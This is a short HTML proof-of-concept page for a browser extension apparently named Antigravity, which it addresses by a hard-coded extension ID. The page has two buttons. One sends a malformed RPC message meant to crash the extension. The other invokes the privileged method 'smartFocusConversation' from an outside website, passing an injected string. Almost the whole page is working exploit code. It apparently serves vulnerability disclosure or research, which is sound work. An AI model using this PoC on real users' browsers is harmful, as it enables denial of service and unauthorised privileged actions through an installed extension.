<!doctype html>
<html>
<head>
  <title>Antigravity Extension RPC PoC</title>
</head>
<body>
  <h2>External RPC Invocation PoC</h2>

  <button onclick="crash()">DoS / Crash Test</button>
  <button onclick="exploit()">Privileged RPC Test</button>

  <pre id="out"></pre>

  <script>
    const EXT_ID = "eeijfnjmjelapkebgockoeaadonbchdd";

    function send(msg) {
      chrome.runtime.sendMessage(EXT_ID, msg, r => {
        out.textContent = JSON.stringify(r, null, 2);
      });
    }

    function crash() {
      send({ action: "rpcCall" });
    }

    function exploit() {
      send({
        action: "rpcCall",
        method: "smartFocusConversation",
        params: { L: "Injected by malicious website" }
      });
    }
  </script>
</body>
</html>
